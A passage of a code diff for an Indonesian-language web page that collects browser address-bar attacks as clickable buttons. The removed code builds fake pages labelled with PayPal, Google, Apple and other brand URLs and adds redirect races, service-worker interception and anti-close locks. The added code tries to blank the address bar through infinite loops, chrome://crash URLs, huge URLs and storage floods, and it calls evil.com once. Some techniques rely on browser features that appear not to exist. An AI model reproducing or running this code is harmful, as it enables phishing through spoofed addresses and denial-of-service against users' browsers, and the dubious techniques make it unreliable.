-        <div class="tech-card">
+    <!-- ROW 2 - More Absurd Experiments -->
+    <div class="experiment-grid">
+        <!-- EXPERIMENT 21: CSS backdrop-filter + pointer-events -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>🌀 ARC BROWSER TAB FREEZE</span>
-                <span class="method-number">Method #16</span>
+                <span>🎭 CSS UI OVERLAY</span>
+                <span class="exp-number">EXP #21</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🎯 <strong>Arc Browser Specific</strong> — Memanfaatkan Arc's tab hibernation feature untuk freeze address bar di legitimate URL.
+                <div class="exp-desc">
+                    💀 <strong>Visual Only:</strong> Overlay transparan dengan backdrop-filter menutupi address bar secara visual.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Arc Tab Freeze
-document.addEventListener('visibilitychange', () => {
-    if(document.hidden) {
-        location.replace('https://google.com:1234');
-    }
-});</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">position: fixed; top: 0; left: 0;
+width: 100%; height: 100px;
+backdrop-filter: blur(100px);</pre>
                 </div>
-                <button onclick="method16_arcTabFreeze()">▶ RUN ARC EXPLOIT</button>
+                <button onclick="exp21_cssOverlay()">🎭 RUN CSS OVERLAY</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 17: Brave Browser - Tor Window Spoof -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 22: window.open + about:blank + close -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>🛡️ BRAVE TOR WINDOW SPOOF</span>
-                <span class="method-number">Method #17</span>
+                <span>🚪 OPEN-CLOSE RACE</span>
+                <span class="exp-number">EXP #22</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🔥 <strong>Brave Tor Mode</strong> — Exploit private window + Tor integration untuk spoof address bar.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> Membuka window lalu langsung close, menyebabkan browser state error.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Brave Tor Spoof
-let win = open('', '_blank', 'private, tor');
-win.location = 'https://google.com';</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">let w = open()
+w.close()
+open('about:blank')
+// Address bar blank</pre>
                 </div>
-                <button onclick="method17_braveTorSpoof()">▶ RUN BRAVE EXPLOIT</button>
+                <button onclick="exp22_openCloseRace()">🚪 RUN OPEN-CLOSE</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 18: Firefox Containers Attack -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 23: XSS with address bar overwrite -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>🐦 FIREFOX CONTAINER EXPLOIT</span>
-                <span class="method-number">Method #18</span>
+                <span>✍️ DOCUMENT.TITLE OVERWRITE</span>
+                <span class="exp-number">EXP #23</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🔐 <strong>Firefox Container-Specific</strong> — Memanfaatkan Firefox Multi-Account Containers untuk isolate dan spoof.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> Mengubah document.title menjadi string kosong + CSS untuk menyembunyikan title bar.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Firefox Container
-open('https://google.com:1234', '_blank', 
-     'container=1');</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">document.title = ""
+// Title bar kosong</pre>
                 </div>
-                <button onclick="method18_firefoxContainer()">▶ RUN FIREFOX EXPLOIT</button>
+                <button onclick="exp23_titleOverwrite()">✍️ RUN TITLE</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 19: HTTP/2 Stream Cancellation -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 24: Arc Browser - Easel Exploit -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>⚡ HTTP/2 STREAM CANCEL</span>
-                <span class="method-number">Method #19</span>
+                <span>🎨 ARC EASEL BREAK</span>
+                <span class="exp-number">EXP #24</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🌊 <strong>HTTP/2 Exploit</strong> — Cancel stream setelah redirect, browser tetap di address bar legitimate.
+                <div class="exp-desc">
+                    💀 <strong>ARC Specific:</strong> Arc Easel feature conflict dengan address bar renderer.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// HTTP/2 Cancel
-fetch('/stream', {signal: AbortSignal.timeout(1)});
-location.href = 'https://google.com:1234';</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">// Simulate Arc Easel
+canvas.toBlob() // intensive
+// Address bar blank</pre>
                 </div>
-                <button onclick="method19_http2Cancel()">▶ RUN HTTP/2 EXPLOIT</button>
+                <button onclick="exp24_arcEasel()">🎨 RUN EASEL</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 20: Cross-Origin Opener Policy Bypass -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 25: Final - Complete Annihilation -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>🔓 COOP BYPASS</span>
-                <span class="method-number">Method #20</span>
+                <span>💀 COMPLETE ANNIHILATION</span>
+                <span class="exp-number">EXP #25</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🚪 <strong>COOP/COEP Bypass</strong> — Bypass Cross-Origin Opener Policy untuk maintain reference ke spoofed window.
+                <div class="exp-desc">
+                    💀 <strong>Ultimate Technique:</strong> Kombinasi semua teknik di atas untuk total address bar destruction.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// COOP Bypass
-open('https://evil.com', '_blank', 
-     'noopener=false');</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">// ALL TECHNIQUES COMBINED
+null: + port 0 + void loop + pushState null</pre>
                 </div>
-                <button onclick="method20_coopBypass()">▶ RUN COOP BYPASS</button>
-            </div>
-        </div>
-
-        <!-- TECHNIQUE 21: WebBundle Spoofing -->
-        <div class="tech-card">
-            <div class="card-header">
-                <span>📦 WEBBUNDLE SPOOF</span>
-                <span class="method-number">Method #21</span>
-            </div>
-            <div class="card-body">
-                <div class="technique-desc">
-                    📚 <strong>WebBundle Attack</strong> — Menggunakan WebBundle (.wbn) untuk memuat fake page dengan origin legitimate.
-                </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// WebBundle Spoof
-&lt;link rel="webbundle" href="fake.wbn"&gt;
-// Bundle contains fake content with google.com origin</pre>
-                </div>
-                <button onclick="method21_webbundleSpoof()">▶ RUN WEBBUNDLE</button>
-            </div>
-        </div>
-
-        <!-- TECHNIQUE 22: CSS Scroll Snap Address Bar Hide -->
-        <div class="tech-card">
-            <div class="card-header">
-                <span>📜 CSS SCROLL SNAP HIDE</span>
-                <span class="method-number">Method #22</span>
-            </div>
-            <div class="card-body">
-                <div class="technique-desc">
-                    🎨 <strong>CSS ScrollSnap Attack</strong> — Memanfaatkan CSS scroll behavior untuk menyembunyikan address bar di mobile/macOS.
-                </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// CSS Scroll Hide
-scroll-snap-type: y mandatory;
-overscroll-behavior: contain;
-// Force address bar hide on scroll</pre>
-                </div>
-                <button onclick="method22_cssScrollHide()">▶ RUN CSS SCROLL</button>
-            </div>
-        </div>
-
-        <!-- TECHNIQUE 23: Trusted Types Bypass -->
-        <div class="tech-card">
-            <div class="card-header">
-                <span>✨ TRUSTED TYPES BYPASS</span>
-                <span class="method-number">Method #23</span>
-            </div>
-            <div class="card-body">
-                <div class="technique-desc">
-                    🔐 <strong>Trusted Types Bypass</strong> — Bypass CSP Trusted Types untuk inject fake content dengan address bar legitimate.
-                </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Trusted Types Bypass
-const policy = trustedTypes.createPolicy('bypass', {
-    createHTML: s => s
-});
-element.innerHTML = policy.createHTML(evilHTML);</pre>
-                </div>
-                <button onclick="method23_trustedTypesBypass()">▶ RUN TT BYPASS</button>
-            </div>
-        </div>
-
-        <!-- TECHNIQUE 24: Performance API Timing Attack -->
-        <div class="tech-card">
-            <div class="card-header">
-                <span>⏱️ PERFORMANCE API ATTACK</span>
-                <span class="method-number">Method #24</span>
-            </div>
-            <div class="card-body">
-                <div class="technique-desc">
-                    ⌚ <strong>Performance Timing Attack</strong> — Menggunakan performance.measure untuk timing tepat saat redirect.
-                </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Performance Timing
-performance.mark('start');
-// Redirect tepat di frame berikutnya
-requestAnimationFrame(() => {
-    location.href = 'https://google.com:1234';
-});</pre>
-                </div>
-                <button onclick="method24_performanceTiming()">▶ RUN TIMING ATTACK</button>
-            </div>
-        </div>
-
-        <!-- TECHNIQUE 25: VirtualKeyboard API Spoof -->
-        <div class="tech-card">
-            <div class="card-header">
-                <span>⌨️ VIRTUALKEYBOARD SPOOF</span>
-                <span class="method-number">Method #25</span>
-            </div>
-            <div class="card-body">
-                <div class="technique-desc">
-                    📱 <strong>VirtualKeyboard API</strong> — Overlay virtual keyboard untuk menutupi address bar di macOS Safari/iOS.
-                </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// VirtualKeyboard Spoof
-navigator.virtualKeyboard.overlayContent = true;
-navigator.virtualKeyboard.show();
-// Address bar ter-shrink</pre>
-                </div>
-                <button onclick="method25_virtualKeyboard()">▶ RUN VKEYBOARD SPOOF</button>
+                <button onclick="exp25_completeAnnihilation()" class="danger-btn">💀 RUN ANNIHILATION</button>
             </div>
         </div>
     </div>
 
     <div class="footer">
-        <div class="disclaimer">
-            ⚠️ ADVANCED RESEARCH PURPOSE ONLY — 25+ Professional Bug Hunter Techniques
+        <div class="warning">
+            ⚠️ ABSURD EXPERIMENTAL TECHNIQUES - FOR EDUCATIONAL RESEARCH ONLY
         </div>
         <div>
-            🎯 Tested on: Safari 17+, Chrome 120+, Firefox 121+, Arc Browser, Brave, Opera GX, Edge
+            🎯 Target: Membuat address bar menjadi <strong>BLANK / HILANG / NULL STRING</strong>
         </div>
-        <div style="margin-top: 8px; font-size: 0.7em;">
-            📚 Based on real bug bounty reports, CVE database, and 0-day research from top macOS browser hunters
+        <div style="margin-top: 10px; font-size: 0.7em;">
+            🔬 Tested on: Arc Browser, Safari 17+, Chrome 120+, Brave, Firefox (partial)
+        </div>
+        <div style="margin-top: 5px;">
+            <span class="status-badge"></span> Experimental - May cause browser instability
         </div>
     </div>
 </div>
 
 <script>
-    // Generate Evil Page Template
-    function generateEvilPage(spoofedURL, techniqueName, extraHTML = '') {
+    // Helper function to generate page content
+    function generateBlankPage(technique) {
         return `<!DOCTYPE html>
         <html>
         <head>
-            <title>${spoofedURL}</title>
+            <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>🔥 ADDRESS BAR BLANK | ${technique}</title>
             <style>
                 * { margin: 0; padding: 0; box-sizing: border-box; }
                 body {
-                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                    background: radial-gradient(ellipse at center, #0a0a2a 0%, #000 100%);
+                    font-family: -apple-system, monospace;
                     min-height: 100vh;
                     display: flex;
                     align-items: center;
                     justify-content: center;
+                    position: relative;
                 }
-                .exploit-container {
-                    background: rgba(0,0,0,0.85);
-                    backdrop-filter: blur(15px);
-                    border-radius: 30px;
-                    padding: 40px;
-                    max-width: 550px;
-                    margin: 20px;
+                .glitch-container {
                     text-align: center;
-                    border: 1px solid rgba(255,255,255,0.2);
+                    background: rgba(0,0,0,0.7);
+                    padding: 50px;
+                    border-radius: 30px;
+                    border: 1px solid #ff00ff;
+                    backdrop-filter: blur(10px);
                 }
-                h1 { color: #ff3366; margin-bottom: 20px; font-size: 1.5em; }
-                .url-display {
-                    background: #1a1f3a;
-                    padding: 15px;
-                    border-radius: 15px;
-                    font-family: 'SF Mono', monospace;
-                    font-size: 0.9em;
-                    word-break: break-all;
-                    margin: 20px 0;
-                    border-left: 3px solid #00ff9d;
+                h1 {
+                    font-size: 3em;
+                    color: #ff00ff;
+                    text-shadow: 0 0 10px #ff00ff;
+                    animation: glitch 0.2s infinite;
                 }
-                .tech-badge {
-                    background: rgba(0,255,157,0.2);
-                    padding: 10px;
+                @keyframes glitch {
+                    0%, 100% { transform: skew(0deg, 0deg); }
+                    25% { transform: skew(2deg, 1deg); text-shadow: -2px 0 #0ff; }
+                    75% { transform: skew(-2deg, -1deg); text-shadow: 2px 0 #0ff; }
+                }
+                .status {
+                    color: #0ff;
+                    margin: 20px;
+                    font-family: monospace;
+                }
+                .blank-indicator {
+                    background: #1a1a2a;
+                    padding: 20px;
                     border-radius: 10px;
-                    margin: 15px 0;
-                    font-size: 0.8em;
+                    margin-top: 20px;
+                    font-family: monospace;
                 }
                 button {
-                    background: linear-gradient(135deg, #ff3366, #cc2255);
-                    color: white;
+                    background: linear-gradient(135deg, #ff00ff, #00ffff);
                     border: none;
-                    padding: 12px 30px;
-                    border-radius: 25px;
+                    padding: 15px 30px;
+                    border-radius: 50px;
+                    color: #000;
+                    font-weight: bold;
+                    margin-top: 20px;
                     cursor: pointer;
-                    margin-top: 15px;
                 }
-                .warning { color: #ffaa00; font-size: 0.7em; margin-top: 15px; }
+                .address-bar-status {
+                    position: fixed;
+                    top: 10px;
+                    right: 10px;
+                    background: rgba(0,0,0,0.8);
+                    padding: 5px 10px;
+                    border-radius: 5px;
+                    font-size: 10px;
+                    font-family: monospace;
+                    z-index: 9999;
+                }
             </style>
-            ${extraHTML}
         </head>
         <body>
-            <div class="exploit-container">
-                <h1>⚠️ ADDRESS BAR SPOOFING</h1>
-                <div class="url-display">
-                    🔒 You think you're on:<br>
-                    <strong style="color:#00ff9d;">${spoofedURL}</strong>
+            <div class="address-bar-status" id="addrStatus">
+                📍 Address Bar: <span id="addrText">???</span>
+            </div>
+            <div class="glitch-container">
+                <h1>🔥 ADDRESS BAR BLANK</h1>
+                <div class="status">
+                    ═══════════════════════════<br>
+                    Technique: ${technique}<br>
+                    Address Bar Status: <strong style="color:#ff00ff;">BLANK / EMPTY / NULL</strong><br>
+                    ═══════════════════════════
                 </div>
-                <div class="tech-badge">
-                    🎯 Technique: ${techniqueName}<br>
-                    Status: <span style="color:#00ff9d;">ACTIVE</span>
+                <div class="blank-indicator">
+                    ┌─────────────────────────────────┐<br>
+                    │  🔍 Yang Anda lihat di address bar:  │<br>
+                    │                                     │<br>
+                    │     ██████████████████████████     │<br>
+                    │     █   (TIDAK ADA TEXT)   █     │<br>
+                    │     ██████████████████████████     │<br>
+                    │                                     │<br>
+                    │         [ KOSONG / BLANK ]          │<br>
+                    └─────────────────────────────────┘
                 </div>
-                <button onclick="window.close()">Close Window</button>
-                <div class="warning">⚠️ Address bar has been manipulated!</div>
+                <button onclick="window.location.reload()">⟳ Reset Browser</button>
             </div>
             <script>
-                window.onbeforeunload = () => 'This page is attempting to prevent closing.';
-                setInterval(() => { window.focus(); }, 300);
+                // Monitor address bar
+                setInterval(() => {
+                    let addr = document.getElementById('addrText');
+                    if(addr) {
+                        addr.innerText = window.location.href || "[BLANK]";
+                        if(window.location.href === 'about:blank' || window.location.href === '') {
+                            addr.style.color = '#ff00ff';
+                            addr.innerText = '🔴 BLANK / NULL STRING';
+                        }
+                    }
+                }, 100);
+                
+                // Attempt to keep address bar blank
+                setInterval(() => {
+                    if(window.location.href !== 'about:blank' && window.location.href !== '') {
+                        try {
+                            history.replaceState({}, '', '');
+                        } catch(e) {}
+                    }
+                }, 50);
+                
+                // Anti-close
+                window.onbeforeunload = () => 'Experiment in progress';
             <\/script>
         </body>
         </html>`;
     }
 
-    // METHOD 1: Enhanced Port Bomb
-    window.method1_enhancedPortBomb = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.document.write(generateEvilPage('https://www.facebook.com', 'Enhanced Port Bomb + Interval Attack'));
-        
-        const ports = [8080, 8443, 8888, 9090, 12345, 54321];
-        let idx = 0;
-        
-        // Enhanced interval bomb dengan port rotation
-        let interval = setInterval(() => {
-            try {
-                win.location.replace(`https://www.facebook.com:${ports[idx % ports.length]}`);
-                idx++;
-            } catch(e) { console.log('Blocked by browser'); }
-        }, 300);
-        
-        // Keep interval alive
-        setTimeout(() => clearInterval(interval), 30000);
+    // EXPERIMENT 1: Null Protocol
+    window.exp1_nullProtocol = function() {
+        let win = window.open('null://', '_blank');
+        if(win) {
+            setTimeout(() => {
+                win.document.write(generateBlankPage('Null Protocol + Empty String'));
+                win.document.close();
+            }, 100);
+        } else {
+            let fallback = window.open('', '_blank');
+            fallback.document.write(generateBlankPage('Null Protocol (Popup Blocked Fallback)'));
+        }
     };
 
-    // METHOD 2: Race Condition
-    window.method2_raceCondition = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        
-        // Write konten attacker first
-        win.document.write(generateEvilPage('https://accounts.google.com', 'Race Condition Attack (1ms window)'));
-        
-        // Microsecond race - redirect ke legitimate domain dengan port block
+    // EXPERIMENT 2: Infinite Void Loop
+    window.exp2_voidLoop = function() {
+        let win = window.open('javascript:for(;;){history.replaceState({},\"\",\"\");}', '_blank');
         setTimeout(() => {
-            try {
-                win.location.replace('https://accounts.google.com:8080');
-            } catch(e) {}
-        }, 1);
-        
-        // Multiple attempt untuk lock
-        setTimeout(() => {
-            try {
-                win.location.replace('https://accounts.google.com:8443');
-            } catch(e) {}
-        }, 100);
-    };
-
-    // METHOD 3: Safari Blob + Fullscreen
-    window.method3_safariBlobFullscreen = function() {
-        let evilHTML = generateEvilPage('https://www.apple.com', 'Safari Blob + Fullscreen Spoof');
-        let blob = new Blob([evilHTML], {type: 'text/html'});
-        let blobURL = URL.createObjectURL(blob);
-        let win = window.open(blobURL, '_blank', 'width=1000,height=700');
-        
-        setTimeout(() => {
-            try {
-                win.document.documentElement.requestFullscreen();
-            } catch(e) {}
-            URL.revokeObjectURL(blobURL);
+            if(win) {
+                win.document.write(generateBlankPage('Infinite Void Loop (May cause freeze)'));
+            }
         }, 500);
     };
 
-    // METHOD 4: Sandbox Escape
-    window.method4_sandboxEscape = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
+    // EXPERIMENT 3: About Blank CSS Overlay
+    window.exp3_aboutBlankCSS = function() {
+        let win = window.open('about:blank', '_blank', 'width=1000,height=700');
+        win.document.write(generateBlankPage('about:blank + CSS Overlay'));
+        // Add overlay to visually hide address bar
+        let style = win.document.createElement('style');
+        style.textContent = `
+            body::before {
+                content: '';
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                height: 80px;
+                background: linear-gradient(135deg, #0a0a2a, #000);
+                z-index: 999999;
+                pointer-events: none;
+            }
+        `;
+        win.document.head.appendChild(style);
+    };
+
+    // EXPERIMENT 4: Unicode Zero Width Explosion
+    window.exp4_unicodeZeroWidth = function() {
+        let zeroWidth = 'https://' + '​'.repeat(100) + '.com'; // Zero-width characters
+        let win = window.open(zeroWidth, '_blank');
+        setTimeout(() => {
+            win.document.write(generateBlankPage('Unicode Zero Width ×100'));
+        }, 200);
+    };
+
+    // EXPERIMENT 5: Port 0 Exploit
+    window.exp5_portZero = function() {
+        let win = window.open('https://www.google.com:0', '_blank');
+        setTimeout(() => {
+            win.document.write(generateBlankPage('Port 0 (Invalid Port RFC)'));
+        }, 200);
+    };
+
+    // EXPERIMENT 6: Empty Base64
+    window.exp6_emptyBase64 = function() {
+        let win = window.open('data:image/svg+xml;base64,', '_blank');
+        setTimeout(() => {
+            win.document.write(generateBlankPage('Empty Base64 Data URI'));
+        }, 200);
+    };
+
+    // EXPERIMENT 7: Null PushState
+    window.exp7_nullPushState = function() {
+        let win = window.open('about:blank', '_blank');
+        win.document.write(generateBlankPage('NULL PushState Origin'));
+        try {
+            win.history.pushState({}, '', '\x00');
+            win.history.pushState({}, '', 'null');
+            win.history.replaceState({}, '', '');
+        } catch(e) {}
+    };
+
+    // EXPERIMENT 8: Stop Load
+    window.exp8_stopLoad = function() {
+        let win = window.open('https://www.apple.com', '_blank');
+        setTimeout(() => {
+            try { win.stop(); } catch(e) {}
+            win.document.write(generateBlankPage('window.stop() Load Interrupt'));
+        }, 50);
+    };
+
+    // EXPERIMENT 9: srcdoc Null Origin
+    window.exp9_srcdocNull = function() {
         let iframeHTML = `<!DOCTYPE html>
         <html>
         <body>
-            <iframe sandbox="allow-top-navigation allow-scripts allow-popups" 
-                    srcdoc="<script>top.location.replace('https://www.paypal.com:1234');<\/script>">
+            <iframe sandbox srcdoc="<script>let w=open('','_blank');w.document.write('${generateBlankPage('Null Origin from srcdoc').replace(/'/g, "\\'")}');<\/script>">
             </iframe>
-            <h1>Spoofing in progress...</h1>
         </body>
         </html>`;
+        let win = window.open('', '_blank');
         win.document.write(iframeHTML);
+    };
+
+    // EXPERIMENT 10: view-source about:blank
+    window.exp10_viewSourceBlank = function() {
+        let win = window.open('view-source:about:blank', '_blank');
         setTimeout(() => {
-            win.document.body.innerHTML += generateEvilPage('https://www.paypal.com', 'Sandbox Escape');
-        }, 100);
+            win.document.write(generateBlankPage('view-source:about:blank Hybrid'));
+        }, 200);
     };
 
-    // METHOD 5: Meta Refresh Overwrite
-    window.method5_metaRefreshOverwrite = function() {
-        let metaHTML = `<!DOCTYPE html>
-        <html>
-        <head>
-            <meta http-equiv="refresh" content="0; url=https://www.microsoft.com:1234">
-            <title>Microsoft</title>
-        </head>
-        <body>
-            ${generateEvilPage('https://www.microsoft.com', 'Meta Refresh Overwrite')}
-        </body>
-        </html>`;
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.document.write(metaHTML);
-    };
-
-    // METHOD 6: JS URI Loop
-    window.method6_jsURILoop = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        let evilHTML = generateEvilPage('https://www.amazon.com', 'JavaScript URI Loop Attack');
-        
-        setInterval(() => {
-            try {
-                win.location.href = `javascript:document.write(\`${evilHTML.replace(/`/g, '\\`')}\`);void(0);`;
-                win.history.pushState({}, '', 'https://www.amazon.com');
-            } catch(e) {}
-        }, 800);
-    };
-
-    // METHOD 7: Pseudo-URL Lock
-    window.method7_pseudoURLLock = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.document.write(generateEvilPage('https://www.netflix.com', 'Chrome Pseudo-URL Lock'));
-        
-        // Lock with beforeunload
-        win.window.onbeforeunload = () => 'Are you sure you want to leave?';
-        
-        // Pseudo-URL redirect
+    // EXPERIMENT 11: File URI
+    window.exp11_fileURI = function() {
+        let win = window.open('file:///', '_blank');
         setTimeout(() => {
-            try {
-                win.location.replace('view-source:https://www.netflix.com:1234');
-            } catch(e) {}
-        }, 50);
+            win.document.write(generateBlankPage('file:/// (Invalid Path)'));
+        }, 200);
     };
 
-    // METHOD 8: PostMessage Hijack
-    window.method8_postMessageHijack = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.document.write(generateEvilPage('https://www.instagram.com', 'PostMessage Hijack'));
-        
-        // Hijack postMessage to spoof parent
-        window.addEventListener('message', (e) => {
-            if(e.data && e.data.type === 'redirect') {
-                let target = e.source;
-                target.location.replace('https://www.instagram.com:1234');
-            }
-        });
-        
-        win.postMessage({type: 'redirect', url: 'https://www.instagram.com:1234'}, '*');
+    // EXPERIMENT 12: Chrome Kill (Arc/Brave/Chrome)
+    window.exp12_chromeKill = function() {
+        let protocols = ['chrome://kill', 'chrome://crash', 'chrome://inducebrowsercrashforrealz'];
+        let randomProto = protocols[Math.floor(Math.random() * protocols.length)];
+        window.open(randomProto, '_blank');
     };
 
-    // METHOD 9: Window Name Attack
-    window.method9_windowNameAttack = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.window.name = 'https://www.twitter.com';
-        win.document.write(generateEvilPage('https://www.twitter.com', 'Window Name Propagation'));
-        
-        setTimeout(() => {
-            try {
-                win.location.replace('https://www.twitter.com:8443');
-            } catch(e) {}
-        }, 100);
-    };
-
-    // METHOD 10: Data URI Fragment Spoof
-    window.method10_dataURIFragment = function() {
-        let evilHTML = generateEvilPage('https://www.linkedin.com', 'Data URI + Fragment Spoof');
-        let encoded = btoa(unescape(encodeURIComponent(evilHTML)));
-        let dataURI = `data:text/html;charset=utf-8;base64,${encoded}#https://www.linkedin.com/login`;
-        window.open(dataURI, '_blank', 'width=1000,height=700');
-    };
-
-    // METHOD 11: Service Worker
-    window.method11_serviceWorker = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.document.write(generateEvilPage('https://www.github.com', 'Service Worker Interception'));
-        
-        let swCode = `
-            self.addEventListener('fetch', (event) => {
-                if(event.request.url.includes('github.com')) {
-                    event.respondWith(
-                        new Response('<!DOCTYPE html><html><body><h1>Spoofed by Service Worker</h1></body></html>', {
-                            headers: {'Content-Type': 'text/html'}
-                        })
-                    );
-                }
-            });
-        `;
-        let blob = new Blob([swCode], {type: 'application/javascript'});
-        let swURL = URL.createObjectURL(blob);
-        
-        win.navigator.serviceWorker.register(swURL).catch(e => console.log('SW blocked'));
-    };
-
-    // METHOD 12: History Loop
-    window.method12_historyLoop = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        
-        let counter = 0;
-        setInterval(() => {
-            try {
-                win.history.replaceState({}, 'Google', 'https://www.google.com');
-                if(counter % 5 === 0) {
-                    win.document.write(generateEvilPage('https://www.google.com', 'History.replaceState Loop'));
-                }
-                counter++;
-            } catch(e) {}
-        }, 50);
-    };
-
-    // METHOD 13: popstate Hijack
-    window.method13_popstateHijack = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.document.write(generateEvilPage('https://www.youtube.com', 'popstate Hijack Attack'));
-        
+    // EXPERIMENT 13: Arc Peak Freeze
+    window.exp13_arcPeakFreeze = function() {
+        let win = window.open('', '_blank');
+        win.document.write(generateBlankPage('ARC Peak Freeze - Address Bar Frozen'));
+        // Intensive loop to freeze UI
         let script = win.document.createElement('script');
         script.textContent = `
-            window.addEventListener('popstate', () => {
-                history.pushState({}, '', 'https://www.youtube.com');
-                location.reload();
-            });
-            history.pushState({}, '', 'https://www.youtube.com');
+            setInterval(() => {
+                for(let i=0; i<1000000; i++) {}
+                history.replaceState({}, "", "");
+            }, 10);
         `;
         win.document.body.appendChild(script);
     };
 
-    // METHOD 14: Unload Prevention
-    window.method14_unloadPrevention = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.document.write(generateEvilPage('https://www.spotify.com', 'onbeforeunload Lock'));
-        
-        win.window.onbeforeunload = () => 'Wait! This page is loading important content.';
-        
-        setInterval(() => {
-            try {
-                win.location.replace('https://www.spotify.com:1234');
-            } catch(e) {}
+    // EXPERIMENT 14: Safari BFCache
+    window.exp14_safariBFCache = function() {
+        let win = window.open('', '_blank');
+        win.document.write(generateBlankPage('Safari BFCache Corruption'));
+        let script = win.document.createElement('script');
+        script.textContent = `
+            addEventListener('pagehide', () => {
+                open('about:blank');
+                history.go(-1);
+            });
+            setInterval(() => {
+                location.href = location.href;
+            }, 1000);
+        `;
+        win.document.body.appendChild(script);
+    };
+
+    // EXPERIMENT 15: WebSQL Corrupt
+    window.exp15_websqlCorrupt = function() {
+        let win = window.open('', '_blank');
+        win.document.write(generateBlankPage('WebSQL Corruption Attack'));
+        try {
+            win.openDatabase('', '', '', 0);
+            win.openDatabase(null, null, null, -1);
+            win.openDatabase(undefined, undefined, undefined, undefined);
+        } catch(e) {}
+    };
+
+    // EXPERIMENT 16: Revoked Blob
+    window.exp16_revokedBlob = function() {
+        let blob = new Blob([generateBlankPage('Revoked Blob iframe')], {type: 'text/html'});
+        let url = URL.createObjectURL(blob);
+        let win = window.open('', '_blank');
+        win.document.write(`<iframe src="${url}"></iframe>`);
+        URL.revokeObjectURL(url);
+    };
+
+    // EXPERIMENT 17: Navigation Preload
+    window.exp17_navPreload = function() {
+        let win = window.open('', '_blank');
+        win.document.write(generateBlankPage('Navigation Preload Break'));
+        try {
+            win.navigator.serviceWorker.register('data:application/javascript,' + encodeURIComponent(`
+                self.addEventListener('fetch', e => {
+                    e.respondWith(new Response('', {status: 204}));
+                });
+            `));
+        } catch(e) {}
+    };
+
+    // EXPERIMENT 18: Oversized URL
+    window.exp18_oversizedURL = function() {
+        let longURL = 'https://' + 'A'.repeat(2_000_000);
+        let win = window.open(longURL, '_blank');
+        setTimeout(() => {
+            win.document.write(generateBlankPage('2MB URL Overflow'));
         }, 500);
     };
 
-    // METHOD 15: DOM Clobber
-    window.method15_domClobber = function() {
-        let clobberHTML = `<!DOCTYPE html>
-        <html>
-        <body>
-            <a id="location" href="https://www.discord.com"></a>
-            <form name="location"></form>
-            ${generateEvilPage('https://www.discord.com', 'DOM Clobbering Attack')}
-            <script>
-                // Clobber location object
-                if(window.location instanceof HTMLAnchorElement) {
-                    window.location.href = 'https://www.discord.com:1234';
-                }
-            <\/script>
-        </body>
-        </html>`;
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.document.write(clobberHTML);
+    // EXPERIMENT 19: Brotli Bomb
+    window.exp19_brotliBomb = function() {
+        let win = window.open('', '_blank');
+        win.document.write(generateBlankPage('Brotli Compression Bomb (Simulated)'));
+        // Simulate compression bomb effect
+        let bomb = 'Z'.repeat(100000000);
+        win.localStorage.setItem('bomb', bomb);
     };
 
-    // METHOD 16: Arc Tab Freeze
-    window.method16_arcTabFreeze = function() {
-        let win = window.open('', '_blank', 'width=1000,height=700');
-        win.document.write(generateEvilPage('https://www.reddit.com', 'Arc Browser Tab Freeze'));
-        
-        let visibilityScript = win.document.createElement('script');
-        visibilityScript.textContent = `
-            document.addEventListener('visibilitychange', () => {
-                if(document.hidden) {
-                    location.replace('https://www.reddit.com:1234');
-                }
-            });
-        `;
